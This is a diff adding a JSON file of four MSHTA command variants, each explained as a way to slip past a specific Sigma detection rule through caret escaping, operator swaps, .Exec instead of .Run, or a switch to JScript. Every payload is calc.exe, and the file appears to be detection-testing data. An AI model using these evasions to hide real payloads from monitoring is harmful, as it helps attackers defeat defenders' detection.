@@ -1,0 +1,18 @@
+[
+  {
+    "output": "mshta vbscript:CreateObject(\"WScript.Shell\").Run(\"calc.exe\",0)(window.close)",
+    "explanation": "This command executes a benign payload (calc.exe) via MSHTA directly, bypassing the need for environment variables. Because the Sigma rule relies on 'contains|all', omitting the 'set' command and the '&&' operator causes the detection to fail."
+  },
+  {
+    "output": "set a=calc.exe & mshta vbscript:CreateObject(\"WScript.Shell\").Exec(\"%a%\")(window.close)",
+    "explanation": "This variant bypasses the rule by substituting the '&&' operator with a single '&' (sequential execution) and the '.run' method with '.Exec'. Since the rule strictly looks for the exact strings '&&' and '.run', these functional equivalents evade the signature."
+  },
+  {
+    "output": "set a=calc.exe && mshta javascript:a=new ActiveXObject(\"WScript.Shell\");a.Run(\"%a%\");window.close();",
+    "explanation": "This command shifts the execution language from VBScript to JScript. By doing so, it avoids the 'vbscript:createobject' string entirely, breaking the 'contains|all' logic of the rule while achieving the same outcome."
+  },
+  {
+    "output": "set a=1 && m^shta vbscript:createobject(\"WScript.Shell\").run(\"calc.exe\")(window.close)",
+    "explanation": "This simulated command bypasses the detection rule by utilizing cmd.exe caret (^) escaping. The Sigma rule requires the exact string 'mshta' to be present in the CommandLine log. By using 'm^shta', the Windows command processor evaluates and executes 'mshta', but the raw log will contain the caret, breaking the 'contains|all' logical condition. This highlights the need for command-line normalization or regex-based detection to handle basic obfuscation."
+  }
+]
